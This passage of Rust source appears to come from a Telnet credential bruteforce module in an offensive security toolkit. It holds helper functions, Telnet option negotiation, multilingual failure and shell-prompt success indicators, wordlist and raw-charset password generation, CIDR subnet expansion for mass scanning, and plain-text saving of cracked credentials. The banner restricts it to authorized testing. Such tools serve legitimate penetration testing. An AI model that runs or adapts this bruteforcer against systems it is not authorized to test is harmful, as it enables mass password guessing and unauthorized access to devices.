     "bad username", "user unknown", "unknown user", "connection refused",
     "connection closed", "connection reset", "too many", "maximum",
     // Spanish
     "incorrecto", "fallido", "denegado", "inválido", "autenticación fallida",
     "acceso denegado", "permiso denegado", "no autorizado",
     // French
     "incorrect", "échoué", "refusé", "invalide", "authentification échouée",
     "accès refusé", "permission refusée", "non autorisé",
     // Portuguese
     "incorreto", "falhou", "negado", "inválido", "autenticação falhou",
     "acesso negado", "permissão negada", "não autorizado",
     // German
     "falsch", "fehlgeschlagen", "verweigert", "ungültig", "authentifizierung fehlgeschlagen",
     "zugriff verweigert", "berechtigung verweigert", "nicht autorisiert",
     // Italian
     "errato", "fallito", "negato", "non valido", "autenticazione fallita",
     "accesso negato", "permesso negato", "non autorizzato",
     // Russian
     "неправильный", "не удалось", "отказано", "недействительный", "аутентификация не удалась",
     "доступ запрещен", "разрешение отклонено", "не авторизован",
     // Chinese
     "错误", "失败", "拒绝", "无效", "认证失败",
     "访问被拒绝", "权限被拒绝", "未授权",
     // Japanese
     "間違っている", "失敗", "拒否", "無効", "認証失敗",
     "アクセス拒否", "許可拒否", "未承認",
     ].iter().map(|s| s.to_string()).collect(),
    )
}

/// Strip ANSI escape sequences from terminal output for cleaner parsing
/// Handles CSI sequences like \x1b[31m (colors), \x1b[2J (clear screen), etc.
#[derive(Debug)]
enum EofType {
    CleanClose,      // Server properly closed connection (e.g., logout)
    AbruptDisconnect, // Connection reset or network error
    PartialData,     // Got some data then EOF
}

fn classify_eof(response: &str, login_sent: bool, pass_sent: bool, cycle: i32) -> EofType {
    if response.is_empty() {
        // No data received before EOF
        if cycle == 0 {
            // EOF immediately after connect - not a telnet server
            EofType::CleanClose
        } else {
            // EOF after some cycles - abrupt disconnect
            EofType::AbruptDisconnect
        }
    } else {
        // Some data received before EOF
        let response_lower = response.to_lowercase();

        // Check for clean logout indicators
        let clean_close_indicators = [
            "logout", "goodbye", "bye", "closed", "disconnected",
            "connection closed", "session ended", "logged out"
        ];

        for indicator in &clean_close_indicators {
            if response_lower.contains(indicator) {
                return EofType::CleanClose;
            }
        }

        // Check if we got a meaningful response that suggests the connection worked
        if (login_sent || pass_sent) && response.len() > 10 {
            EofType::PartialData
        } else {
            EofType::AbruptDisconnect
        }
    }
}

fn has_success_indicators(response: &str) -> bool {
    if response.len() < 5 {
        return false;
    }

    let response_lower = response.to_lowercase();

    // Check for success indicators at the end of response
    let success_indicators = [
        "$ ", "# ", "> ", "~ ", "% ", "last login", "welcome",
        "login successful", "authentication successful", "logged in",
        "access granted", "successfully", "ok", "accepted",
        " # ", " ~# ", " /# ", " ~ # ", " / # ", " ~ #", "/ #", "~#", "/#",
        "built-in shell", "欢迎", "已经登录", "认证成功"
    ];

    for indicator in &success_indicators {
        if response_lower.contains(indicator) {
            return true;
        }
    }

    false
}

fn is_connection_error(error: &std::io::Error) -> bool {
    use std::io::ErrorKind::*;
    matches!(error.kind(),
             ConnectionReset | ConnectionAborted | ConnectionRefused |
             NetworkUnreachable | HostUnreachable | NetworkDown |
             BrokenPipe | NotConnected | TimedOut
    )
}

/// Telnet IAC (Interpret As Command) constants
const IAC: u8 = 255;  // 0xFF
const DONT: u8 = 254; // 0xFE
const DO: u8 = 253;   // 0xFD
const WONT: u8 = 252; // 0xFC
const WILL: u8 = 251; // 0xFB
const SB: u8 = 250;   // 0xFA - Subnegotiation Begin
const SE: u8 = 240;   // 0xF0 - Subnegotiation End
const GA: u8 = 249;   // 0xF9 - Go Ahead
const EL: u8 = 248;   // 0xF8 - Erase Line
const EC: u8 = 247;   // 0xF7 - Erase Character
const AYT: u8 = 246;  // 0xF6 - Are You There
const AO: u8 = 245;  // 0xF5 - Abort Output
const IP: u8 = 244;  // 0xF4 - Interrupt Process
const BREAK: u8 = 243; // 0xF3
const DM: u8 = 242;   // 0xF2 - Data Mark
const NOP: u8 = 241;  // 0xF1 - No Operation

/// Telnet option codes
const ECHO: u8 = 1;
const SUPPRESS_GO_AHEAD: u8 = 3;
const TERMINAL_TYPE: u8 = 24;
const WINDOW_SIZE: u8 = 31;
const TERMINAL_SPEED: u8 = 32;
const REMOTE_FLOW_CONTROL: u8 = 33;
const LINEMODE: u8 = 34;
const ENVIRONMENT_VARIABLES: u8 = 36;

/// Generate IAC response for option negotiation
/// Returns bytes to send in response to server option requests
fn generate_iac_response(cmd: u8, option: u8) -> Vec<u8> {
    match cmd {
        DO => {
            // Server wants us to enable an option
            // Accept basic options that are safe and commonly used
            match option {
                ECHO | SUPPRESS_GO_AHEAD => {
                    // Accept these as they're standard and safe
                    vec![IAC, WILL, option]
                }
                TERMINAL_TYPE | WINDOW_SIZE | TERMINAL_SPEED | REMOTE_FLOW_CONTROL | LINEMODE | ENVIRONMENT_VARIABLES => {
                    // Refuse advanced options we don't implement
                    vec![IAC, WONT, option]
                }
                _ => {
                    // Unknown option - refuse it
                    vec![IAC, WONT, option]
                }
            }
        }
        DONT => {
            // Server wants us to disable an option - always comply
            vec![IAC, WONT, option]
        }
        WILL => {
            // Server wants to enable an option
            // Accept basic options; refuse advanced ones
            match option {
                ECHO | SUPPRESS_GO_AHEAD => {
                    vec![IAC, DO, option]
                }
                TERMINAL_TYPE | WINDOW_SIZE | TERMINAL_SPEED | REMOTE_FLOW_CONTROL | LINEMODE | ENVIRONMENT_VARIABLES => {
                    vec![IAC, DONT, option]
                }
                _ => {
                    vec![IAC, DONT, option]
                }
            }
        }
        WONT => {
            // Server refuses an option - acknowledge
            vec![IAC, DONT, option]
        }
        _ => vec![] // Unknown command, no response
    }
}

/// Process Telnet IAC commands and return clean application data
/// Handles option negotiation (WILL/WONT/DO/DONT) and strips IAC sequences
/// Returns (clean_data, iac_responses) where iac_responses are bytes to send back
fn process_telnet_iac(data: &[u8]) -> (Vec<u8>, Vec<u8>) {
    let mut result = Vec::with_capacity(data.len());
    let mut iac_responses = Vec::new();
    let mut i = 0;

    while i < data.len() {
        if data[i] == IAC {
            if i + 1 >= data.len() {
                // Incomplete IAC sequence, skip
                break;
            }

            let cmd = data[i + 1];

            match cmd {
                IAC => {
                    // Double IAC means literal 0xFF byte
                    result.push(IAC);
                    i += 2;
                }
                WILL | WONT | DO | DONT => {
                    // Option negotiation: IAC [WILL|WONT|DO|DONT] <option>
                    if i + 2 < data.len() {
                        let option = data[i + 2];
                        // Generate appropriate response
                        let response = generate_iac_response(cmd, option);
                        iac_responses.extend_from_slice(&response);
                        i += 3;
                    } else {
                        // Incomplete negotiation, skip
                        break;
                    }
                }
                SB => {
                    // Subnegotiation: IAC SB <option> <data> IAC SE
                    // Skip until we find IAC SE
                    i += 2; // Skip IAC SB
                    while i < data.len() {
                        if data[i] == IAC && i + 1 < data.len() && data[i + 1] == SE {
                            i += 2; // Skip IAC SE
                            break;
                        }
                        i += 1;
                    }
                }
                GA | EL | EC | AYT | AO | IP | BREAK | DM | NOP => {
                    // Single-byte commands, just skip them
                    i += 2;
                }
                _ => {
                    // Unknown command, skip IAC and the byte after it
                    i += 2;
                }
            }
        } else {
            // Regular data byte
            result.push(data[i]);
            i += 1;
        }
    }

    (result, iac_responses)
}

/// Strip ANSI escape sequences from terminal output for cleaner parsing
/// Handles CSI sequences (\x1b[...), OSC sequences (\x1b]...), and other escape types
fn strip_ansi_escape_sequences(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();
    let mut in_escape = false;
    let mut escape_type = EscapeType::None;

    while let Some(ch) = chars.next() {
        if ch == '\x1b' {
            // Start of escape sequence
            if let Some(next_ch) = chars.peek() {
                match next_ch {
                    '[' => {
                        // CSI sequence: ESC [
                        chars.next(); // consume '['
                        in_escape = true;
                        escape_type = EscapeType::CSI;
                        continue;
                    }
                    ']' => {
                        // OSC sequence: ESC ]
                        chars.next(); // consume ']'
                        in_escape = true;
                        escape_type = EscapeType::OSC;
                        continue;
                    }
                    '(' | ')' => {
                        // Character set sequences: ESC ( or ESC )
                        chars.next(); // consume '(' or ')'
                        in_escape = true;
                        escape_type = EscapeType::Charset;
                        continue;
                    }
                    _ => {
                        // Other escape sequences
                        in_escape = true;
                        escape_type = EscapeType::Other;
                        continue;
                    }
                }
            }
        }

        if in_escape {
            // Inside escape sequence - look for sequence terminator based on type
            let should_end = match escape_type {
                EscapeType::CSI => {
                    // CSI ends with a letter, @, `, or {
                    ch.is_ascii_alphabetic() || ch == '@' || ch == '`' || ch == '{'
                }
                EscapeType::OSC => {
                    // OSC ends with ESC \ (ST - String Terminator) or BEL (0x07)
                    ch == '\x07' || (ch == '\\' && chars.peek() == Some(&'\x1b'))
                }
                EscapeType::Charset => {
                    // Character set sequences are typically single character
                    true
                }
                EscapeType::Other => {
                    // For other escapes, look for common terminators
                    ch.is_ascii_alphabetic() || ch.is_ascii_digit() || ch == '\x07'
                }
                EscapeType::None => false,
            };

            if should_end {
                let was_osc = escape_type == EscapeType::OSC;
                in_escape = false;
                escape_type = EscapeType::None;
                // For OSC sequences ending with ESC \, consume the \
                if was_osc && ch == '\\' {
                    continue;
                }
            }
            // Skip all characters in escape sequence
            continue;
        }

        result.push(ch);
    }

    result
}

#[derive(Clone, Copy, PartialEq)]
enum EscapeType {
    None,
    CSI,    // Control Sequence Introducer: ESC [
    OSC,    // Operating System Command: ESC ]
    Charset,// Character set: ESC ( or ESC )
    Other,  // Other escape sequences
}

/// Sanitize user input to prevent format string attacks and display issues
/// Removes or escapes potentially dangerous characters
fn sanitize_input(input: &str) -> String {
    input.chars()
    .map(|c| {
        if c.is_control() || c == '%' {
            '?'
        } else if c == '\r' || c == '\n' || c == '\t' {
            ' '
        } else {
            c
        }
    })
    .collect()
}

/// Enhanced error classification with specific error types for better debugging
fn classify_telnet_error(msg: &str) -> &'static str {
    let lower = msg.to_lowercase();

    // Connection-related errors
    if lower.contains("connection refused") || lower.contains("connection reset") {
        "Connection refused/reset"
    } else if lower.contains("connection aborted") {
        "Connection aborted"
    } else if lower.contains("connection closed") || lower.contains("connection abruptly closed") {
        "Connection closed"
    } else if lower.contains("connection timeout") || lower.contains("connect timeout") {
        "Connection timeout"
    } else if lower.contains("read timeout") || lower.contains("timeout") {
        "Read timeout"
    } else if lower.contains("write timeout") {
        "Write timeout"
    } else if lower.contains("broken pipe") {
        "Broken pipe"
    } else if lower.contains("network unreachable") {
        "Network unreachable"
    } else if lower.contains("host unreachable") {
        "Host unreachable"
    } else if lower.contains("network down") {
        "Network down"
    } else if lower.contains("no route to host") {
        "No route to host"
    }
    // DNS and resolution errors
    else if lower.contains("cannot resolve") || lower.contains("dns") || lower.contains("name resolution") {
        "DNS resolution failed"
    } else if lower.contains("name or service not known") {
        "Hostname not found"
    }
    // Authentication and protocol errors
    else if lower.contains("authentication failed") || lower.contains("auth failed") {
        "Authentication failed"
    } else if lower.contains("authentication error") || lower.contains("auth error") {
        "Authentication error"
    } else if lower.contains("login failed") || lower.contains("login incorrect") {
        "Login failed"
    } else if lower.contains("access denied") || lower.contains("permission denied") {
        "Access denied"
    } else if lower.contains("invalid") && (lower.contains("user") || lower.contains("password") || lower.contains("credential")) {
        "Invalid credentials"
    } else if lower.contains("no banner") || lower.contains("banner read") {
        "No banner received"
    } else if lower.contains("handshake") || lower.contains("protocol") {
        "Protocol/handshake error"
    }
    // I/O and system errors
    else if lower.contains("too many open files") || lower.contains("resource temporarily unavailable") {
        "Resource exhaustion"
    } else if lower.contains("interrupted") || lower.contains("would block") {
        "I/O interrupted"
    } else if lower.contains("invalid argument") {
        "Invalid argument"
    } else if lower.contains("not connected") {
        "Not connected"
    }
    // Telnet-specific errors
    else if lower.contains("iac") || lower.contains("telnet option") {
        "Telnet option negotiation error"
    } else if lower.contains("malformed") || lower.contains("corrupt") {
        "Malformed data"
    }
    // Generic fallback
    else {
        "Other error"
    }
}

async fn load_and_validate_config(path: &str, target: &str) -> Result<TelnetBruteforceConfig> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut config: TelnetBruteforceConfig = serde_json::from_str(&content)?;
    config.target = target.to_string();
    config.preprocess_prompts();

    let mut errors = Vec::new();

    if config.port == 0 { errors.push("Port must be > 0".to_string()); }
    if config.threads == 0 || config.threads > 256 {
        errors.push("Threads must be 1-256".to_string());
    }
    if !(1..=60).contains(&config.connection_timeout) {
        errors.push("Connection timeout: 1-60s".to_string());
    }

    if !errors.is_empty() {
        return Err(anyhow!("Validation errors:\n  - {}", errors.join("\n  - ")));
    }

    Ok(config)
}

async fn save_config(config: &TelnetBruteforceConfig, path: &str) -> Result<()> {
    let json = serde_json::to_string_pretty(config)?;
    tokio::fs::write(path, json).await?;
    Ok(())
}

fn print_config_summary(config: &TelnetBruteforceConfig) {
    println!("\n{}", "=== Configuration ===".bold().cyan());
    println!("  Target:     {}:{}", config.target, config.port);
    println!("  Threads:    {}", config.threads);
    println!("  Delay:      {}ms", config.delay_ms);
    println!("  Output:     {}", config.output_file);
    println!("{}", "====================".cyan());
}

fn print_config_format() {
    println!("{}", "=== JSON Configuration Format ===".bold().cyan());
    println!("{}", r##"{
    "port": 23,
    "username_wordlist": "users.txt",
    "password_wordlist": "passwords.txt",
    "threads": 8,
    "delay_ms": 100,
    "connection_timeout": 3,
    "read_timeout": 1,
    "stop_on_success": false,
    "verbose": false,
    "full_combo": false,
    "raw_bruteforce": false,
    "raw_charset": "abcdefghijklmnopqrstuvwxyz",
    "raw_min_length": 1,
    "raw_max_length": 4,
    "output_file": "results.txt",
    "append_mode": false,
    "pre_validate": true,
    "retry_on_error": true,
    "max_retries": 2,
    "login_prompts": ["login:", "username:"],
    "password_prompts": ["password:"],
    "success_indicators": ["$", "#", "welcome"],
    "failure_indicators": ["incorrect", "failed", "denied"]
}
"##);
    println!("{}", "================================".cyan());
}

// src/modules/creds/generic/telnet_bruteforce.rs - PART 4/4
// Utility Functions, Prompts, and Helper Functions

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

async fn should_use_streaming(total_size: u64) -> Result<bool> {
    if total_size > MAX_MEMORY_SIZE {
        let size_mb = total_size as f64 / (1024.0 * 1024.0);
        println!("\n{}", format!("[!] Large wordlists: {:.1} MB", size_mb).yellow());
        println!("Options:");
        println!("  1. Load into memory (faster, ~{:.0} MB RAM)", size_mb);
        println!("  2. Streaming mode (slower, minimal memory)");
        println!();
        Ok(!prompt_yes_no("Load into memory? (y/n): ", true).await?)
    } else {
        Ok(false)
    }
}

async fn load_wordlists_streaming(
    config: &TelnetBruteforceConfig,
) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
    println!("[*] Using streaming mode...");
    let user_count = count_nonempty_lines(&config.username_wordlist).await?;
    let pass_count = if let Some(ref path) = config.password_wordlist {
        count_nonempty_lines(path).await?
    } else {
        0
    };
    Ok((Vec::new(), Vec::new(), user_count, pass_count))
}

async fn load_wordlists_memory(
    config: &TelnetBruteforceConfig,
) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
    println!("[*] Loading wordlists into memory...");
    let (usernames, passwords) = tokio::join!(
        load_wordlist(&config.username_wordlist),
                                              async {
                                                  if let Some(ref path) = config.password_wordlist {
                                                      load_wordlist(path).await
                                                  } else {
                                                      Ok(Vec::new())
                                                  }
                                              }
    );

    let usernames = usernames?;
    let passwords = passwords?;
    Ok((usernames.clone(), passwords.clone(), usernames.len(), passwords.len()))
}

fn calculate_estimated_attempts(
    config: &TelnetBruteforceConfig,
    username_count: usize,
    password_count: usize,
) -> usize {
    let mut estimated = if config.full_combo {
        username_count * password_count
    } else if username_count == 1 {
        password_count
    } else if password_count == 1 {
        username_count
    } else {
        password_count
    };

    if config.raw_bruteforce {
        let charset_len = config.raw_charset.chars().count();
        let mut raw_total = 0u64;
        for len in config.raw_min_length..=config.raw_max_length {
            raw_total += charset_len.pow(len as u32) as u64;
        }
        println!("[*] Raw bruteforce: ~{} passwords", raw_total);

        let users_for_raw = if config.full_combo || username_count == 1 {
            username_count as u64
        } else {
            1
        };
        estimated += (raw_total * users_for_raw) as usize;
    }

    estimated
}

async fn initialize_output_file(output_file: &str, config: &TelnetBruteforceConfig) -> Result<()> {
    if !config.append_mode {
        let mut f = File::create(output_file).await?;
        f.write_all(format!("# Telnet Results - {}\n", chrono::Local::now()).as_bytes()).await?;
        f.write_all(format!("# Target: {}:{}\n", config.target, config.port).as_bytes()).await?;
        f.write_all(b"# Format: username:password\n\n").await?;
    }
    Ok(())
}

async fn validate_telnet_target(addr: &str, config: &TelnetBruteforceConfig) -> Result<()> {
    // Use async lookup_host
    let socket = lookup_host(addr).await?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let mut stream = timeout(
        Duration::from_secs(config.connection_timeout),
                             TcpStream::connect(socket)
    ).await??;

    let mut buf = vec![0u8; 1024];
    match timeout(Duration::from_secs(config.banner_read_timeout), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();
            if response.contains("login") || response.contains("username") ||
                response.contains("telnet") || response.contains("password") {
                    Ok(())
                } else {
                    Err(anyhow!("No telnet prompts detected"))
                }
        }
        _ => Err(anyhow!("No response from target")),
    }
}

/// Buffered writer for efficient result output
/// Maintains an open file handle and buffers writes to reduce I/O operations
struct BufferedResultWriter {
    file: tokio::fs::File,
    buffer: Vec<String>,
    buffer_size_limit: usize,
    flush_interval: std::time::Duration,
    last_flush: std::time::Instant,
}

impl BufferedResultWriter {
    async fn new(output_file: &str) -> Result<Self> {
        let file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(output_file)
        .await?;

        Ok(Self {
            file,
            buffer: Vec::with_capacity(100), // Pre-allocate space for 100 lines
           buffer_size_limit: 50, // Flush every 50 lines
           flush_interval: std::time::Duration::from_secs(5), // Or every 5 seconds
           last_flush: std::time::Instant::now(),
        })
    }

    async fn write_result(&mut self, username: &str, password: &str) -> Result<()> {
        self.buffer.push(format!("{}:{}", username, password));

        // Flush if buffer is full or enough time has passed
        if self.buffer.len() >= self.buffer_size_limit ||
            self.last_flush.elapsed() >= self.flush_interval {
                self.flush().await?;
            }

            Ok(())
    }

    async fn flush(&mut self) -> Result<()> {
        if self.buffer.is_empty() {
            return Ok(());
        }

        let mut content = self.buffer.join("\n");
        content.push('\n');

        self.file.write_all(content.as_bytes()).await?;
        self.file.flush().await?;

        self.buffer.clear();
        self.last_flush = std::time::Instant::now();

        Ok(())
    }

    async fn finalize(&mut self) -> Result<()> {
        self.flush().await?;
        self.file.sync_all().await?; // Ensure data is written to disk
        Ok(())
    }
}

impl Drop for BufferedResultWriter {
    fn drop(&mut self) {
        // Note: We can't do async operations in Drop, but we can flush synchronously
        // The finalize() method should be called explicitly to ensure data integrity
        // This Drop implementation is mainly for safety in case finalize() wasn't called
        let _ = self.file.sync_all(); // Best effort sync
    }
}


async fn print_final_report(
    found_creds: &Arc<Mutex<HashSet<(String, String)>>>,
                            output_file: &str,
) {
    let found = found_creds.lock().await;
    println!();
    if found.is_empty() {
        println!("{}", "[-] No valid credentials found".yellow());
    } else {
        println!("{}", format!("[+] Found {} credential(s):", found.len()).green().bold());
        let mut sorted: Vec<_> = found.iter().collect();
        sorted.sort();
        for (u, p) in sorted.iter() {
            println!("  {}  {}:{}", "✓".green(), u, p);
        }
        println!("\n[*] Results saved to: {}", output_file);
        println!("{}", "[!] WARNING: Credentials are stored in plain text. Secure the file appropriately!".yellow().bold());
    }
}

async fn load_wordlist(path: &str) -> Result<Vec<String>> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content
    .lines()
    .filter_map(|s| {
        let trimmed = s.trim();
        (!trimmed.is_empty()).then(|| trimmed.to_string())
    })
    .collect())
}

async fn count_nonempty_lines(path: &str) -> Result<usize> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content.lines().filter(|line| !line.trim().is_empty()).count())
}

fn parse_single_target(input: &str) -> Result<Vec<String>> {
    let input = input.trim();

    if input.contains('/') {
        match input.parse::<ipnetwork::IpNetwork>() {
            Ok(network) => {
                let mut ips = Vec::new();
                for ip in network.iter() {
                    ips.push(ip.to_string());
                }
                println!("[*] Expanded {} to {} hosts", input, ips.len());
                Ok(ips)
            }
            Err(_) => Err(anyhow!("Invalid CIDR: {}", input)),
        }
    } else {
        Ok(vec![input.to_string()])
    }
}

fn parse_targets(input: &str) -> Result<Vec<String>> {
    let mut targets = Vec::new();

    for line in input.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        if line.contains('/') {
            match line.parse::<ipnetwork::IpNetwork>() {
                Ok(network) => {
                    for ip in network.iter() {
                        targets.push(ip.to_string());
                    }
                }
                Err(_) => println!("{} Invalid CIDR: {}", "[!]".yellow(), line),
            }
        } else {
            targets.push(line.to_string());
        }
    }

    Ok(targets)
}

async fn load_credentials_file(path: &str) -> Result<Vec<(String, String)>> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut creds = Vec::new();

    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        if let Some((user, pass)) = line.split_once(':') {
            creds.push((user.trim().to_string(), pass.trim().to_string()));
        }
    }

    Ok(creds)
}

fn save_batch_results(results: &[ScanResult], filename: &str) -> Result<()> {
    let mut file = std::fs::OpenOptions::new()
    .create(true)
    .append(true)
    .open(filename)?;

    use std::io::Write;
    for result in results {
        let creds_str = match &result.credentials {
            Some((u, p)) => format!("{}/{}", u, if p.is_empty() { "(blank)" } else { p }),
            None => "none".to_string(),
        };

        writeln!(
            file,
            "[{}] {}:{} - {} - banner: {}",
            result.timestamp,
            result.ip,
            result.port,
            creds_str,
            result.banner.replace('\n', " ").replace('\r', "")
        )?;
    }

    Ok(())
}

// local normalize_target replaced by crate::utils::normalize_target

// ============================================================
// PROMPT/INPUT FUNCTIONS
// ============================================================

fn display_banner() {
    println!();
    println!("{}", "╔══════════════════════════════════════════════╗".bright_cyan());
    println!("{}", "║   TELNET SECURITY TESTING MODULE            ║".bright_cyan());
    println!("{}", "║   Advanced Bruteforce & Subnet Scanner      ║".bright_cyan());
    println!("{}", "╚══════════════════════════════════════════════╝".bright_cyan());
    println!();
    println!("{}", "⚠️  AUTHORIZED USE ONLY".yellow().bold());
    println!("{}", "    Unauthorized access is ILLEGAL".yellow());
    println!();
}

// prompt and prompt_required are replaced by crate::utils imports/usage
// prompt_yes_no is replaced by crate::utils imports/usage

async fn prompt_port(default: u16) -> Result<u16> {
    Ok(prompt_int_range("Port", default as i64, 1, 65535).await? as u16)
}

async fn prompt_delay(default: u64) -> Result<u64> {
    Ok(prompt_int_range("Delay in ms", default as i64, 0, 10000).await? as u64)
}

async fn prompt_timeout(msg: &str, default: u64) -> Result<u64> {
    Ok(prompt_int_range(msg, default as i64, 1, 60).await? as u64)
}

async fn prompt_threads(default: usize) -> Result<usize> {
    Ok(prompt_int_range("Threads", default as i64, 1, 256).await? as usize)
}

async fn prompt_retries(default: usize) -> Result<usize> {
    Ok(prompt_int_range("Max retries", default as i64, 0, 10).await? as usize)
}

async fn prompt_wordlist(prompt_text: &str) -> Result<String> {
    // Strip ": " if present to match prompt_existing_file style
    let msg = prompt_text.trim_end_matches(": ").trim_end_matches(":").trim();
    prompt_existing_file(msg).await
}

async fn prompt_optional_wordlist(prompt_text: &str) -> Result<Option<String>> {
    let msg = prompt_text.trim_end_matches(": ").trim_end_matches(":").trim();
    if prompt_yes_no(&format!("Use {}?", msg), true).await? {
        Ok(Some(prompt_existing_file(msg).await?))
    } else {
        Ok(None)
    }
}
async fn prompt_charset(prompt_text: &str, default: &str) -> Result<String> {
    prompt_default(prompt_text, default).await
}

async fn prompt_min_length(default: usize, min: usize, max: usize) -> Result<usize> {
    Ok(prompt_int_range("Min length", default as i64, min as i64, max as i64).await? as usize)
}

async fn prompt_max_length(default: usize, min: usize, max: usize) -> Result<usize> {
    Ok(prompt_int_range("Max length", default as i64, min as i64, max as i64).await? as usize)
}

async fn prompt_list(prompt_text: &str) -> Result<Vec<String>> {
    let input = prompt_default(prompt_text, "").await?;
    Ok(input
    .split(',')
    .map(|s| s.trim().to_string())
    .filter(|s| !s.is_empty())
    .collect())
}

// prompt function removed as it is superseded by specific prompts or prompt_default

